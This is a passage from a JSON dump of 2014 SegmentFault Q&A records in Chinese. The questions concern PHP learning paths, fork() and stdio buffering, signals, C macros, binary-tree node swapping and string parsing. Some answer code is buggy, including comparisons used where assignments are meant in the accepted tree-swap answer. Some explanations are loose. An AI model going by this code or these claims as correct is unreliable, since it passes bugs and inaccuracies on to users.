      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000596640\">\n<p>最烦这种类型的问题了，达到瓶颈就该换个语言学学？换个语言就能解决所有问题？</p>\n<p>吐槽暂且完毕，回归问题。你说你遇到了瓶颈，瓶颈在哪？或者说，你遇到了什么业务什么场景，php无法（很好）完成任务？我举个我自己的例子，我遇到的是一个数据抓取的场景，php虽然能完成这个功能，但从运行效率考虑无法很好地完成（尽管有诸如pthreads之类的工具），我了解了一下其他语言对于这个场景的情况，选择了node.js，很好地完成了任务。</p>\n<p>看了你的描述，我觉得你对于php的应用还局限在web端，那有没有尝试过拿php写一些别的东西？php-cli也还不错哦。我见过一个案例是有人拿php实现了一套支持c语言（子集）和php混写的语言的编译器（转为二进制代码）和解释器（←他是出于加密代码的目的写的），哦对了，那人当时高三升大一。突然觉得自己弱爆了。。。</p>\n<p>啰嗦了这么多，其实我想说的就两点，如果你的瓶颈是有具体的需求，而php无法支持（尽管我非常希望php能是万能的，但至少现在，这还只能是梦想），那么去选择能够很好的解决你需求的语言；如果你是学习到了一定程度，觉得已经孤独求败了，我想问，你对于php真的有你想象地那么熟悉吗？php是一个弱类型的语言，它是如何实现的？php的内存回收机制是怎样的？不要觉得这些是底层的东西，我是写上层代码的就不用去关心。如果能够了解的话，有时候能帮你解决一些非常非常非常隐蔽的坑。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000596530\">\n<p>我从python 的<code>tornado</code>框架中了解到web的真谛，可以试试 ^_^</p>\n<p>你了解了这么多，我想下一步应该是不断的解决各种味道的问题，从问题中吸取精华</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000598963\">\n<p>学习另外一门语言主要不是用来提升你的PHP能力的，选语言主要是为了解决不同场景与类型的问题，这也就是为什么会有这么多语言的原因，现在针对你的技能点，我谈下我的想法：<br>\n第一：PHP框架源码以及设计模式，你阅读各个框架的源码，那么首先你要明确，你是否真正理解其设计思想，与设计理念，你从中吸取了多少作者的思想？如果让你自己写一套框架，你可以真正上手了吗？不要认为，阅读了源码，看的懂代码，就以为明白了，这只是阅读的第一步；<br>\n第二：nosql,暂且说你都用过这些技术，那么你能很明确的清楚他们之间的最本质的区别吗？技术选型的时候，你能很明确的说出为什么要选这个，这个比起其他几个nosql来说，优势在哪里？再换个方向，你学过了memcache,那么分布式呢？分布式的情况下，memcache如果扩容呢？如何保证其伸缩性，和扩展性呢？<br>\n第三：环境搭建，优化，负载，mysql主从，那我且问你，你掌握了这些技能，都只是会用，根本谈不上根据场景的变化，做出相应的配置，比如给你1000万-1亿的PV网站，你来架构，你难道还是就一个主从套上去就好了吗？海量数据你又采用什么方式解决呢？<br>\n最后总结：非常理解楼主认为自己到达瓶颈的想法，上述写的只是想说，不管学习认识的技术，想想这个东西为什么要出来，他的诞生是用来解决什么问题的，最后再研究下他的原理，而不是很多技术，我学过用过就好了，这样没有深入的理解，是不会有多大效果的，最后建议楼主学习一下C语言，可以研究PHP源码，这样在写代码的时候也会考虑性能问题，同时通过C语言的学习，可以研究各种软件的源码和他们的原理，比如memcache,apache,nginx都可以去往源码方面研究，你会看到更多东西，学习JAVA会对你的框架设计思想以及设计模式方面有所提升</br></br></br></br></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000596526\">\n<h1>技能树</h1>\n<h2>php</h2>\n<ul>\n<li>框架<br><br><ul>\n<li>yii/yii2</li>\n<li>phalcon</li>\n<li>yaf</li>\n<li>thinkphp</li>\n<li>其他大大小小框架源码都读过很多</li>\n</ul>\n</br></br></li>\n<li>Composer</li>\n<li>Redis/Memcached/Mongdb</li>\n</ul>\n<h2>Linux</h2>\n<ul>\n<li>lnmp环境搭建、优化</li>\n<li>负载均衡</li>\n<li>mysql主从/redis主从</li>\n<li>服务器运维</li>\n</ul>\n<p>现在只是每天坚持看些linux方面的知识，感觉php学习达到了瓶颈，看一些优秀框架源码大致的设计模式也都清楚，所以现在基本就是看了个大概就没心思再跟代码跟下去了，感觉能提升的东西已经很有限了，急需学习一门新语言来拓展下眼界。</p>\n<p>眼下比较纠结是研究<strong>C or Java or Python</strong></p>\n</div>",
      "favourite": "25",
      "glance": "4.4k",
      "tags": [
        "php",
        "linux",
        "c",
        "java",
        "python"
      ],
      "time": "2014-07-05",
      "title": "从事php有一段时间了，感觉达到一定瓶颈，该学习哪种语言拓展下视野？",
      "url": "https://segmentfault.com/q/1010000000596526"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000603667\">\n<p>个人认为fork出来的东西是拷贝的，意思就是</p>\n<ul>\n<li>\n<strong>fd是文件描述符</strong>： 父进程的文件描述符等于子进程的文件描述符，关闭其中一个，另外一个值相等的也就关闭了。</li>\n<li>\n<strong>fp是文件流的指针</strong>： 父进程的fp指针\"等于\"子进程的fp指针，关闭其中一个指针，并没有销毁回收另外一个指针，他们的地址不同父进程**fp!=子进程**fp。</li>\n</ul>\n<p>表打我。。。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000597921\">\n<ol>\n<li>fork以后的语句子进程都会执行，所以在父进程关闭文件之前，已经把hello写入了。</li>\n<li>同样不明白= =。</li>\n</ol>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000605104\">\n<html><body>\n<ul>\n<li><p>首先要理解<code>fork</code>的一个特性： 父进程的所有打开文件描述符都会被复制到子进程中，父、子进程的每个相同的打开描述符共享一个文件表项。如下图（摘自APUE）所示。另外，在文件表中还有一项：<strong>打开文件引用计数</strong>，引用这个文件对象的描述符数（<code>dup</code>和<code>fork</code>都会增加这个计数，第一次<code>open</code>会使此计数为1，<code>close</code>会减小此计数，为0时销毁文件对象）。所以在程序的运行过程中，不管是父进程还是子进程先<code>close(fd)</code>或<code>fclose(fp)</code>,该文件表依然存在并没有被销毁，只有当文件表中的<strong>打开文件引用计数</strong>为0时才会销毁这个文件表对象。</p></li>\n<li><p><strong>题1</strong>中的I/O都是通过<strong>Linux系统调用</strong>来完成的,这些函数也常被称为<strong>不带缓冲的I/O(unbuffered I/O)</strong>。所以每一次调用都会立即写入文件中。而对于<strong>题2</strong>中的标准I/O库函数来说，都是带缓冲的，文件一般都是<strong>全缓冲</strong>，也就是说一定要把缓冲区填满才能进行实际的I/O操作。在执行语句<code>fprintf(fp, \"%s\", msg1);</code>时，由于没有填满缓冲区而实际的I/O操作并未完成。这时却调用了<code>fork</code>函数，这个函数同时也会把该缓冲区复制一份给子进程，这样在父、子进程中就各有一份<code>msg1</code>，当缓冲区填满后就会被刷新以进行实际的I/O操作（写入文件）。<a href=\"http://www.cplusplus.com/reference/cstdio/fflush/?kw=fflush\" rel=\"nofollow\"><code>int fflush ( FILE * stream );</code></a>函数能够提供手动进行刷新缓冲区，楼主可以试试在将<code>msg1</code>写入文件这条语句后面加上<code>fflush(fp);</code>则得出的结果将会和<strong>题1</strong>一样。</p></li>\n</ul>\n<p><img data-src=\"/image?src=http://img.my.csdn.net/uploads/201303/24/1364119383_7850.png&amp;objectId=1020000000605104&amp;token=1df6b7fd770e4480d4f90f37652ae1df\"/></p>\n</body></html>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000597201\">\n<html><body>\n<p><img data-src=\"http://segmentfault.com/img/bVcFwl\"/></p>\n<p><img data-src=\"http://segmentfault.com/img/bVcFwm\"/></p>\n<p>然后结果为：<br><img data-src=\"http://segmentfault.com/img/bVcFwo\"/></br></p>\n<p>==================================<br><strong>不太理解为何父进程已经把文件关了，而子进程依旧可以写入。<br>\n而且fork()创建的子进程不是应该执行fork之后的代码吗，为何题2又可以把第一句话写入</br></strong></br></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "linux",
        "编程",
        "c"
      ],
      "time": "2014-07-06",
      "title": "《linux编程实践教程》中的两个习题， 有关fork的",
      "url": "https://segmentfault.com/q/1010000000597201"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000672648\">\n<p>在一个应用中，注册了信号的处理函数，并添加了相应的处理。</p>\n<p>主程序中，同时也调用了<code>msgrcv</code>接口（工作在阻塞状态下）。程序运行在前台，当按下<code>ctrl+c</code>的时信号处理函数并没有收到该信号，而是<code>msgrcv</code>收到信号中断退出了。这样的话，信号处理函数就没有什么作用了。</p>\n<p>针对这个问题，大家如何看，又如何处理？</p>\n</div>",
      "favourite": "2",
      "glance": "1.5k",
      "tags": [
        "c"
      ],
      "time": "2014-09-17",
      "title": "关于主线程收不到信号的问题",
      "url": "https://segmentfault.com/q/1010000000672648"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000697981\">\n<pre><code>#define LOG(level, format, ...) \\\n    do { \\\n        fprintf(stdout, \"[%s|%s@%s,%d] \" format \"\\n\", \\\n                level, __func__, __FILE__, __LINE__, ##__VA_ARGS__ ); \\\n    } while (0)\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000699739\">\n<p>clojure.core里面有一个pipeline宏是这样的 -&gt;<br>\n用法如下</br></p>\n<pre><code>    (-&gt; a f0 (f1 b) (f2 c d) f3 ....)\n</code></pre>\n<p>会被展开为</p>\n<pre><code>   (...(f3 (f2 (f1 (f0 a) b) c d))...)\n</code></pre>\n<p>这个非常好用。</p>\n<p>另外有一个宏叫if-let</p>\n<pre><code>(if-let [x (get-something...)]\n   (f x) (g))\n</code></pre>\n<p>展开之后变成</p>\n<pre><code>(let [x (get-something...)]\n  (if x (f x) (g)))\n</code></pre>\n<p>如果用命令式的方式语言来写，可能像是这样的：</p>\n<pre><code>if-let (x=get-something(...))\n    f(x); \nelse\n    g();\n</code></pre>\n<p>展开为</p>\n<pre><code>x = get-something(...);\nif (x) f(x); else g();\n</code></pre>\n<p>另外，我公司的项目里面也有很多精彩的宏，比如这个：</p>\n<pre><code>(defmacro spy [body]\n  `(let [ret# (try ~body\n                   (catch Exception e#\n                     (do\n                       (println \"\\033[33;1mSpy Result in\" ~(str *ns*) \"\\033[0m\\n \"\n                                \"\\033 36;1m\" ~(pr-str body) \"\\033[0m\"\n                                \"\\n\\033[35;1m has thrown an Exception\\033[m\\n\")\n                       (clojure.stacktrace/print-cause-trace e#))))]\n     (println \"\\n\\033[33;1mSpy Result in\" ~(str *ns*) \"\\033[0m\\n \"\n              \"\\033[36;1m\" ~(pr-str body) \"\\033[0m\"\n              \"\\n\\033[35;1m=&gt;\" (pr-str ret#) \"\\033[0m\\n\")\n     ret#))\n</code></pre>\n<p>这个起到的作用是，在程序运行时、不影响程序工作（不影响任何函数的返回值）的情况下，把标记了spy的代码的所在命名空间、源代码和这段代码在当前运行时的返回值实时输出在屏幕上。</p>\n<p>而有另外一个宏叫做with-spy，这个宏后面指定一系列已经存在函数的函数名，那么在这个宏之内每次调用这些函数，都会触发spy</p>\n<p>当然还有deep-spy宏，会级联地spy所标记部分的代码中所有的执行过程。</p>\n<p>另外，clojure里面的case（相当于命令式语言的switch-case结构）、cond（case的条件式扩展，通过断言而不是值来判定选择树）、doseq迭代器（相当于其他语言的foreach）、for迭代生成器、用来定义函数的defn（没错，相当与js里面的function xxx (...) ）全都是宏——而不是写死在编译器里的——这使得clojure只有十几个基本元（公理），而基本元之外的整个clojure语言内核都是直接由clojure自身的代码构成的（这不是用c写gcc，而是——比如用clojure1.7的一部分构建出clojure1.7的另一部分——而保持版本号不变——其他lisp也是如此）</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000698022\">\n<p>摘自《<a href=\"http://www.amazon.cn/gp/product/B0017LHUG8/ref=as_li_ss_tl?ie=UTF8&amp;camp=536&amp;creative=3132&amp;creativeASIN=B0017LHUG8&amp;linkCode=as2&amp;tag=favbook-23\" rel=\"nofollow\">C专家编程</a>》 （如果你正在学习C/C++，建议你多读几遍这本书。网上有电子版，我就不给链接了。）</p>\n<hr>\n<p>根据位模式构建图形图标（icon）或者图形(glyph)，是一种小型的位模式映射于屏幕产生的图像。一个位代表图像上的一个像素。如果一个位被设置，那么它所代表的像素就是“亮”的。如果一个位被清除，那么它所代表的像素就是“暗”的。所以，一系列的整数值能够用于为图像编码。类似Iconedit这样的工具就是用于绘图的，他们所输出的是一个包含一系列整型数的ASCII文件，可以被一个窗口程序所包含。它所存在的问题是程序中的图标只是一串十六进制数。</p>\n<p>在C语言中，典型的16X16的黑白图形可能如下：</p>\n<pre><code class=\"lang-c\">static unsigned short stopwatch[] = {\n0x07C6,\n0x1FF7,\n0x383B,\n0x600C,\n0x600C,\n0xC006,\n0xC006,\n0xDF06,\n0xC106,\n0xC106,\n0x610C,\n0x610C,\n0x3838,\n0x1FF0,\n0x07C0,\n0x0000\n};\n</code></pre>\n<p>正如所看到的那样，这些C语言常量并未有提供有关图形实际模样的任何线索。</p>\n<p>这里有一个惊人的#define定义的优雅集合，允许程序建立常量使它们看上去像是屏幕上的图形。</p>\n<pre><code class=\"lang-c\">#define X )*2+1\n#define _ )*2\n#define s ((((((((((((((((0 /* For building glyphs 16 bits wide */\n</code></pre>\n<p>定义了它们之后，只要画所需要的图标或者图形等，程序会自动创建它们的十六进制模式。使用这些宏定义，程序的自描述能力大大加强，上面这个例子可以转变为：</p>\n<pre><code class=\"lang-c\">static unsigned short stopwatch[] =\n{\ns _ _ _ _ _ X X X X X _ _ _ X X _ ,\ns _ _ _ X X X X X X X X X _ X X X ,\ns _ _ X X X _ _ _ _ _ X X X _ X X ,\ns _ X X _ _ _ _ _ _ _ _ _ X X _ _ ,\ns _ X X _ _ _ _ _ _ _ _ _ X X _ _ ,\ns X X _ _ _ _ _ _ _ _ _ _ _ X X _ ,\ns X X _ _ _ _ _ _ _ _ _ _ _ X X _ ,\ns X X _ X X X X X _ _ _ _ _ X X _ ,\ns X X _ _ _ _ _ X _ _ _ _ _ X X _ ,\ns X X _ _ _ _ _ X _ _ _ _ _ X X _ ,\ns _ X X _ _ _ _ X _ _ _ _ X X _ _ ,\ns _ X X _ _ _ _ X _ _ _ _ X X _ _ ,\ns _ _ X X X _ _ _ _ _ X X X _ _ _ ,\ns _ _ _ X X X X X X X X X _ _ _ _ ,\ns _ _ _ _ _ X X X X X _ _ _ _ _ _ ,\ns _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\n};\n</code></pre>\n<p>显然，与前面的代码相比，它的意思更为明显。标准的C语言具有八进制、十进制和十六进制常量，但没有二进制常量，否则的话倒是一种更为简单的绘制图形模式的方法。</p>\n</hr></div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000697885\">\n<p>之前看到这个问题只是在 C/C++ 方面的，现在不限语言，大家都来说说自己见过哪些很赞的宏定义。</p>\n</div>",
      "favourite": "4",
      "glance": "2.1k",
      "tags": [
        "宏",
        "c"
      ],
      "time": "2014-09-27",
      "title": "有哪些不能更赞的宏定义？",
      "url": "https://segmentfault.com/q/1010000000697885"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000721110\">\n<pre><code>void swap_p( pTree *a, pTree *b){\n    pTree tmp;\n    tmp = *a;\n    *a = *b;\n    *b = tmp;\n}\n\nvoid swap(pTree a, pTree b){\n    pTree tmp_left,tmp_right,tmp_parent;\n\n    //swap parent's pointer\n    if( a-&gt;parent-&gt;left == a)\n        a-&gt;parent-&gt;left = b;\n    else\n        a-&gt;parent-&gt;right = b;\n\n    if( b-&gt;parent-&gt;left == b)\n        b-&gt;parent-&gt;left = a;\n    else\n        b-&gt;parent-&gt;right = a;\n\n    //swap child's pointer\n    if( a-&gt;left != NULL){\n        a-&gt;left-&gt;parent = b;\n    }\n    if( a-&gt;right != NULL){\n        a-&gt;right-&gt;parent = b;\n    }\n\n    if( b-&gt;left != NULL){\n        b-&gt;left-&gt;parent = a;\n    }\n    if( b-&gt;right != NULL){\n        b-&gt;right-&gt;parent = a;\n    }\n\n    //swap themselves pointer\n    swap_p( &amp;(a-&gt;parent), &amp;(b-&gt;parent));\n    swap_p( &amp;(a-&gt;left), &amp;(b-&gt;left));\n    swap_p( &amp;(a-&gt;right), &amp;(b-&gt;right));\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000721628\">\n<p><strong>下面的代码是错的, 没有考虑a, b的parent,child节点的指针. 有时间再改把</strong></p>\n<hr>\n<p><strong>先交换,　再事后处理异常情况</strong>　也是一条思路.　<code>检查a,b的left, right, 如果指向了自身, 则知a,b相邻. 把指针重新指向另一个节点即可</code>.</p>\n<pre><code>void swap_ptr(node **p1, node **p2)\n{\n    node *tmp;\n    tmp = *p1;\n    *p1 = *p2;\n    *p2 = tmp;\n}\n\n#define CORRECT_SELF_POINT(a, ptr, b) do {  \\\n    if(((a)-&gt;ptr) == (a)){                  \\\n        ((a)-&gt;ptr) = (b);                   \\\n        (b)-&gt;parent = (a);                  \\\n        return;                             \\\n    }                                       \\\n} while(0)\n\nvoid swap(node *a, node *b){\n    swap_ptr(&amp;(a-&gt;parent),   &amp;(b-&gt;parent));\n    swap_ptr(&amp;(a-&gt;left),     &amp;(b-&gt;left));\n    swap_ptr(&amp;(a-&gt;right),    &amp;(b-&gt;right));\n\n    CORRECT_SELF_POINT(a,   left,     b);\n    CORRECT_SELF_POINT(a,   right,    b);\n    CORRECT_SELF_POINT(b,   left,     a);\n    CORRECT_SELF_POINT(b,   right,    a);\n}\n</code></pre>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000720128\">\n<pre><code>void swap(node* a, node* b)\n{\n    // 处理a与b相邻的情况，\n    // 基本思路：将a指向b的邻边指向自己，将b指向a的邻边指向自己，交换的时候就不会出错\n    if (a-&gt;left == b){\n        a-&gt;left = a;\n        b-&gt;parent = b;\n    }\n    else if (a-&gt;right == b){\n        a-&gt;right = a;\n        b-&gt;parent = b;\n    }\n    else if (a-&gt;parent == b) {\n        a-&gt;parent = a;\n        if (b-&gt;left == a)\n            b-&gt;left == b\n        else\n            b-&gt;right == b;\n    }\n\n    node* tmp = b-&gt;parent;\n    b-&gt;parent = a-&gt;parent;\n    a-&gt;parent = tmp;\n    tmp = b-&gt;right;\n    b-&gt;right = a-&gt;right;\n    a-&gt;right = tmp;\n    tmp = b-&gt;left;\n    b-&gt;left = a-&gt;left;\n    a-&gt;left = tmp;\n}\n</code></pre>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000719645\">\n<p>一个二叉树, 普普通通的二叉树, 结点是这样定义的:</p>\n<pre><code>typedef struct node_t {\n    struct node_t* parent;\n    struct node_t* left;\n    struct node_t* right;\n\n    int data;\n} node;\n</code></pre>\n<p>再简单不过了, 现在递归创建一个二叉树. 假设现在的二叉树是左边这样的, 对调之后是右边这样的.</p>\n<pre><code>     1                    1\n    / \\                  / \\\n   /   \\                /   \\\n  2     3              8     3\n / \\   /              / \\   /\n4   5 6     ----&gt;    4   5 6   \n   / \\                  / \\\n  9   8                9   2\n /                    /\n0                    0\n</code></pre>\n<p>要求一个函数 <code>void swap(node* a, node* b)</code>, swap不能直接对调data:</p>\n<pre><code>// two和eight是内定的, 不要在意这些细节\nprintf(\"%d %d %d\\n\", two-&gt;data,\n        eight-&gt;data,\n        eight-&gt;right); // 2 8 0\nswap(two, eight);\nprintf(\"%d %d %d\\n\", two-&gt;data,\n        eight-&gt;data,\n        eight-&gt;right-&gt;data); // 2 8 5\n</code></pre>\n<p>求一个, 多种/好的解法, 算法小白真心求教...</p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "算法",
        "二叉树",
        "数据结构",
        "c"
      ],
      "time": "2014-10-12",
      "title": "二叉树结点位置对调的问题",
      "url": "https://segmentfault.com/q/1010000000719645"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000741529\">\n<p>给定一个<code>有序</code>链表，去除其中重复的元素,让每个重复的元素只显示一次，我是用单指针做的，但是很奇怪当输入为｛1，1，....｝这种头部元素重复的情况下不能去重，其它情况没有问题，我知道是头部元素没处理好，但到底是哪一行代码逻辑不对呢？代码如下：</p>\n<pre><code>struct ListNode\n{\n    int val;\n    ListNode *next;\n    ListNode(int x) : val(x), next(NULL) {}\n};\nclass Solution\n{\npublic:\n    ListNode *deleteDuplicates(ListNode *head)\n    {\n        ListNode **pcur=&amp;head;\n        if(head==NULL||head-&gt;next==NULL){\n        return head;\n        }\n        while((*pcur)-&gt;next!=NULL)\n        {\n            if((*pcur)-&gt;val==(*pcur)-&gt;next-&gt;val)\n            {\n                *pcur=(*pcur)-&gt;next;\n\n            }\n            else\n            {\n                pcur=&amp;((*pcur)-&gt;next);\n\n            }\n        }\n        return head;\n    }\n};\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "数据结构",
        "算法",
        "c++",
        "c"
      ],
      "time": "2014-10-26",
      "title": "去除有序列表中的重复元素",
      "url": "https://segmentfault.com/q/1010000000741529"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000753202\">\n<p>直接上函数？调用库函数，直接分离，或者</p>\n<hr>\n<pre><code>for() {\nif(a[] == ' ')\nwhile\nb[] = i--;\n}\n</code></pre>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000753461\">\n<p>不知道有几个数的情况下，可以用istringstream</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000753249\">\n<pre><code>int a, b, c, d;\nsscanf(\"123 45 56 89\", \"%d %d %d %d\", &amp;a, &amp;b, &amp;c, &amp;d);\n</code></pre>\n<p><a href=\"http://www.cplusplus.com/reference/cstdio/sscanf/\" rel=\"nofollow\">http://www.cplusplus.com/reference/cstdio/sscanf/</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000753181\">\n<p>假设有以下字符串：</p>\n<pre><code>string str=\"123 45 56 89\";\n</code></pre>\n<p>现把其中连在一起的数字以整型格式单独取出来（int a=123,int b=45），有没有什么好方案？</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "c",
        "c++",
        "string",
        "算法"
      ],
      "time": "2014-11-01",
      "title": "C/C++如何将string内容分离？",
      "url": "https://segmentfault.com/q/1010000000753181"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000753581\">\n<pre><code>int a;\nscanf(\"%d\",&amp;a);\ncin&gt;&gt;a;\n</code></pre>\n<p>ex：我想让用户输入整数，但是如果用户输入的不是我想要的类型如!%$#,abcd....都有什么方法或者函数去判断呢？</p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2014-11-02",
      "title": "C/C++如何判断用户输入是否合法？",
      "url": "https://segmentfault.com/q/1010000000753581"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000766795\">\n<p>如题，因为用到fdopen总是报参数无效，看手册说fdopen时候的权限参数要和open当时一致，问题时怎么知道一个莫名的句柄所具备的rw标志啊？</p>\n</div>",
      "favourite": "0",
      "glance": "913",
      "tags": [
        "c",
        "linux编程"
      ],
      "time": "2014-11-09",
      "title": "判断一个句柄【open时】是w+还是a+",
      "url": "https://segmentfault.com/q/1010000000766795"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000778162\">\n<blockquote>\n<p>代码中的变量在“编译”的时候会全部转换为指针进行存储。</p>\n</blockquote>\n<p>这就是静态语言和动态语言的区别，静态语言编译之后，在内存里将只存在指针。</p>\n<blockquote>\n<p>指针就是变量，变量就是指针。</p>\n</blockquote>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000777240\">\n<p>简单概括一下吧。对全局变量取址的话，汇编代码会直接有一个立即数在里面，作为地址。这个立即数是链接时候确定的。<br>\n局部变量的话，编译器首先会在栈上给他留个空间，否则没有地址，然后以ebp减偏移的方式去计算，偏移在编译这段函数的时候就计算好了。编译之后的代码里没有变量名字，所以不可能有根据名字去地址这样一个操作，顶多用lea做一下运算。<br>\n建议看看《csapp》，前半部分有讲。</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000772250\">\n<p>反编译一下，或者用 gdb 就知道了。</p>\n<blockquote>\n<p>每创建一个变量就要创建一个符号表的话</p>\n</blockquote>\n<p>可能是原文的误解，“每一个变量标识符在编译期间，编译器会为<strong>它们</strong>创建一个符号表，其中存放着变量标识符相应的各种属性，如类型、地址标识等”，这里面的他们，值得是所有的变量，而每个变量这是符号表里面的一个符号而已，所以，不是“为<strong>每个变量</strong>创建一个<strong>符号表</strong>”。</p>\n<p>占用的内存会大，也可能很大，但是一般优秀的编译器都会优化。</p>\n<p>而且，注意这段话里面的一个词语——<strong>在编译期间</strong>。</p>\n<p>第二个问题，读读汇编语言里面的寻址，大概就明白了。</p>\n<p>在C语言中，<strong>每个变量其实都是地址的一个别名</strong>。这个地址可能是 <code>0x1002</code>，为了容易记忆，我们就给他起了一个名字，叫 <code>a</code>。</p>\n<p>其实，<code>a</code> 就是 <code>0x1002</code>，<code>0x1002</code> 就是 <code>a</code>。</p>\n<pre><code>int a = 4;\n</code></pre>\n<p>这个语言大概会编译成</p>\n<pre><code>MOV [1002h] 4   \n; 4是立即数 \n; []直接寻址\n</code></pre>\n<p>意思是把 <code>a</code> 放入 <code>0x1002</code> 的地址里面。</p>\n<p>当我们使用变量时，其实使用的是地址里面的具体值。这个值是二进制的01串，这个值具体是多少，取决于数据类型。</p>\n<p>对于指针操作呢，则直接操作的地址</p>\n<pre><code>int *p = &amp;a;\n</code></pre>\n<p>这句话定义了一个变量 <code>p</code>, <code>p</code> 是一个整数，<code>p</code> 的地址可能是 <code>0x1024</code>, 在这个地址里面，存放着 <code>a</code>（注意，不是 <code>a</code> 地址里面的值，而是 <code>0x1002</code>）。</p>\n<pre><code>MOV P 1024h  \nMOV [P] 1002h\n; 1024是立即数, \n; []直接寻址\n</code></pre>\n<p>为了便于理解，简化了好多。</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000770803\">\n<p>知道 <code>&amp;</code> 取址操作是</p>\n<blockquote>\n<p>每一个变量标识符在编译期间，编译器会为它们创建一个符号表，其中存放着变量标识符相应的各种属性，如类型、地址标识等</p>\n</blockquote>\n<p>那么问题来了：</p>\n<ol>\n<li>每创建一个变量就要创建一个符号表的话，是不是会占用很大的内存？</li>\n<li>整个创建变量并取址的完整过程在系统里是怎么进行的？</li>\n</ol>\n</div>",
      "favourite": "5",
      "glance": "2.3k",
      "tags": [
        "编译原理",
        "c"
      ],
      "time": "2014-11-11",
      "title": "C中对变量取址时，系统内部经过了怎样的一个过程？",
      "url": "https://segmentfault.com/q/1010000000770803"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000779355\">\n<p>fork函数是unix系统中实现多进程的一个基本函数，它看起来非常特殊。首先它创建了一个或多个自身进程的自进程，并且继承了当前进程的上下文资源。</p>\n<p>这一个过程具体是怎么完成的？它是如何做到多个进程同时监听一个资源的，比如有一个tcp连接进来，那么到底应该是哪个子进程去响应这个请求呢？如果子进程再次fork自己会发生什么，可以不停这样下去吗？</p>\n</div>",
      "favourite": "2",
      "glance": "3.3k",
      "tags": [
        "c",
        "fork",
        "linux"
      ],
      "time": "2014-11-11",
      "title": "当执行fork()函数的时候，到底发生了什么",
      "url": "https://segmentfault.com/q/1010000000779355"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000801175\">\n<p>我编写了如下一段代码：</p>\n<pre><code>#include&lt;stdio.h&gt;\n\nint bar() {\n   printf(\"bar\\n\");\n   return 0;\n｝  \nint main() {\n    printf(\"%lu\\n\", sizeof(*bar));\n    return 0;\n}\n</code></pre>\n<p>在debian7-64bit平台用clang3.0-6.2和gcc４.7.2编译运行均输出１，后来我尝试把sizeof(*bar)改成了sizeof(bar),仍然输出了１，但是改成&amp;bar后输出变成了8．<br>\n我猜测sizeof(&amp;bar)输出的应该是函数指针的大小所以是８，那么请问前两种写法输出的是什么呢？</br></p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "c"
      ],
      "time": "2014-11-12",
      "title": "Ｃ语言中sizeof的参数是函数名，返回值是什么？",
      "url": "https://segmentfault.com/q/1010000000801175"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000001619304\">\n<p>为什么像下面这样定义两个数组？</p>\n<pre><code>const uint16_t LEDS = GPIO_Pin_12 | GPIO_Pin_13 | GPIO_Pin_14 | GPIO_Pin_15;\nconst uint16_t LED[4] = {GPIO_Pin_12, GPIO_Pin_13, GPIO_Pin_14, GPIO_Pin_15};\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "1.8k",
      "tags": [
        "c"
      ],
      "time": "2014-11-14",
      "title": "C语言中用按位或( | )定义变量是什么玩法？",
      "url": "https://segmentfault.com/q/1010000001619304"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
